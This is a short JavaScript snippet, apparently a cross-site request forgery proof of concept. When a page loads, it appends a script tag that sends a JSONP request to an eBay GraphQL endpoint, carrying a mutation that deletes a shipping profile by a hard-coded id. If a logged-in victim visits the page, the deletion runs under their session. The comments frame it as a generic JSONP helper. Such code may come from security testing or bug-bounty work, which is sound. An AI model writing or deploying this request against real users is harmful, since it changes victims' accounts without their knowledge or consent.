function executeGraphQLWithJSONP() {
  var graphQLData = '{"operationName":"ShippingProfileDelete","variables":{"input":{"id":"1993776"}},"query":"mutation ShippingProfileDelete($input: deleteProfileInput!) {\\n  deleteProfile(input: $input) {\\n    success\\n    errors {\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n"}';

  // Replace this URL with the GraphQL server URL that supports JSONP
  var endpointURL = "https://cbtemagweb.ebay.com/graphql";

  // Generate a unique callback function name
  var callbackName = "jsonp_" + Date.now();

  // Create the script tag with the JSONP request URL
  var script = document.createElement("script");
  script.src = endpointURL + "?callback=" + callbackName + "&data=" + encodeURIComponent(graphQLData);

  // Add an event listener to handle the script load
  script.addEventListener("load", function() {
    // Remove the script tag after the JSONP request is executed
    script.parentNode.removeChild(script);
  });

  // Add an event listener for the DOMContentLoaded event
  document.addEventListener("DOMContentLoaded", function() {
    // Append the script to the document body when the DOM is fully loaded
    document.body.appendChild(script);
  });

  // Create the global callback function
  window[callbackName] = function (data) {
    // Process the JSONP response here (data should contain the GraphQL response)
    console.log(data);

    // Remove the global callback function
    delete window[callbackName];
  };
}

// Call the function to execute the JSONP request
executeGraphQLWithJSONP();
